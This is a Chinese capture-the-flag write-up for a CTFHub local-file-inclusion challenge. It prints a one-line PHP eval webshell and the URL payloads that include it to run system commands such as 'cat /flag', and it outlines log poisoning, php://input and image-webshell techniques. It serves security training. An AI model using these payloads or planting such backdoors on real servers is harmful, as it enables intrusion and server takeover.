CTFHub RCE - 文件包含

2026年9月22日 CTFHub Web安全 RCE 文件包含

一、题目信息

  • 题目名称：文件包含
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / RCE / 本地文件包含（LFI）
  • 靶场链接：http://challenge-ce78e6a8c07db821.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器

二、解题步骤

1. 分析题目考什么

本题的核心考点是本地文件包含漏洞（LFI）结合服务器上的内置木马。后端使用了 include() 函数引入用户可控的参数。虽然代码使用了 strpos() 检查并过滤了包含 "flag" 的文件名，但服务器上预留了一个名为 shell.txt 的文件。我们只需包含这个不含 flag 的文件，就能触发其中的恶意代码，实现远程代码执行（RCE）。

2. 怎么想（破题思路）

  • 页面直接暴露源码，看到 include $_GET['file'];，这是典型的文件包含漏洞。
  • 尝试包含 flag 相关文件被拦截，提示 Hacker!!!。检查源码发现 !strpos($_GET['file'], "flag")，这意味着不能包含带有 flag 字段的文件名。
  • 源码底部提示了有一个 shell.txt 文件。访问它，发现里面是 。
  • 思路：让主页面包含 shell.txt，同时向该文件中注入参数 ctfhub 来执行系统命令。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录：变量名写错导致无回显

踩坑情况：构造 URL 时，习惯性使用 ?cmd=ls 传参，结果页面一片空白。

原因分析：查看 shell.txt 源码发现，接收参数的变量名是 ctfhub（$_REQUEST['ctfhub']），而不是 cmd。变量名不匹配，导致 eval 接收不到命令。

改进方式：传参时必须使用 ?ctfhub=...，且由于使用了 eval()，命令参数必须是合法的 PHP 语句，需要加分号，例如 system('ls /');。

详细实操步骤

第一步：读取 shell.txt 内容

访问 http://.../shell.txt，获取内容：

<?php eval($_REQUEST['ctfhub']);?>

代码逐字深度解析：

  • <?php：PHP 脚本起始标记。
  • eval：PHP 内置函数，把字符串当作 PHP 代码执行。
  • $_REQUEST['ctfhub']：接收来自 GET 或 POST 请求中名为 ctfhub 的参数。
  • ; 和 ?>：PHP 语句结束和脚本结束标记。

第二步：利用文件包含执行命令

构造 payload，将包含和命令拼接：

http://.../?file=shell.txt&ctfhub=system('ls /');

逻辑解析：

  • ?file=shell.txt：绕过 strpos 过滤（因为没有 flag 关键字），成功包含文件。
  • &ctfhub=system('ls /');：通过 GET 传递参数给 eval，执行系统命令 ls / 查看根目录。

第三步：读取 Flag

根目录下有 flag 文件，直接执行：

http://.../?file=shell.txt&ctfhub=system('cat /flag');

页面回显 ctfhub{709285305d1c599a23b3f2d7}，通关。

4. 怎么迁移（跨领域联想）

  • 文件上传 + 文件包含组合拳：在实战中，如果目标存在 LFI，攻击者通常会先上传一个图片马（避免被拦截），然后通过 LFI 包含该图片马，从而执行 PHP 代码。这是最经典的组合利用方式。
  • php://input 伪协议：在 LFI 漏洞中，如果 allow_url_include 开启，可以使用 ?file=php://input，并通过 POST 请求直接发送 PHP 代码执行。
  • 日志投毒：如果目标无法上传文件，且没有现成木马，攻击者可以将恶意代码写入 User-Agent 或 URL 中，通过 LFI 包含 Web 服务器的日志文件（如 /var/log/apache2/access.log）来执行代码。

三、名词大全与原理深度复盘

1. 文件包含漏洞（File Inclusion）

指服务器通过 PHP 函数（如 include、require）引入文件时，没有对用户可控的参数进行严格校验。攻击者可以引入服务器上的任意文件（LFI）或远程文件（RFI），从而获取敏感信息或执行恶意代码。

2. strpos 过滤与逻辑绕过

strpos($str, "flag") 返回目标字符串在源字符串中的位置。如果找不到返回 false，找到则返回整数位置。!strpos(...) 的判断逻辑是：如果返回 0（即目标在开头），0 会被视为 false，!0 变为 true；如果返回非零，!数字 变为 false。本题中，我们使用不含 "flag" 的 shell.txt，strpos 返回 false，!false 为 true，成功绕过过滤。

3. 为什么会配合 eval 使用？

单纯的文件包含只能读取文件内容，无法执行系统命令。服务器上预设的 shell.txt 中包含了 eval() 函数。当它被包含时，这个后门就被激活了。攻击者再传入 ctfhub 参数，就能让 eval 执行我们想要的任何 PHP 代码。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 eval 执行的区别：eval 执行是直接控制输入代码；文件包含是“借刀杀人”，借服务器本身已有的文件来执行代码。
  • 与文件上传的区别：文件上传是“传进去”（植入木马）；文件包含是“引出来”（激活已存在的木马）。

2. 这种题目的出现原因

开发人员为了方便，经常将用户输入直接拼接到 include 语句中，用于加载模板、语言包或配置文件，却没有限制用户能够包含哪些文件。历史遗留的老旧 PHP 代码中尤为常见。

3. 这种应用在实际中如何体现？

在真实的红蓝对抗中，攻击者一旦发现文件包含漏洞，会首先尝试读取敏感文件（如 /etc/passwd 或 config.php），然后利用文件包含配合图片马、日志投毒或 php:// 伪协议获取服务器权限。

4. 如何抽象理解概念（大白话理解）

把网站服务器比作一个图书馆：

  • 文件包含（include）：管理员有个功能，你点单要哪本书（file 参数），他就把哪本书的内容念给你听。
  • strpos 过滤（不能有 flag）：管理员规定了，不许借带有“flag”名字的书。
  • shell.txt（藏好的武器）：图书馆角落里藏了一本叫 shell.txt 的书。这本书里夹带了一张纸条（PHP 代码），上面写着“如果你念到这本书，请帮我执行 ctfhub 后面跟的指令”。
  • 绕过与利用：你让管理员念了 shell.txt，同时喊了一句指令 ctfhub=ls /。管理员念到纸条时，不由自主地执行了你的指令，帮你找到了 Flag。
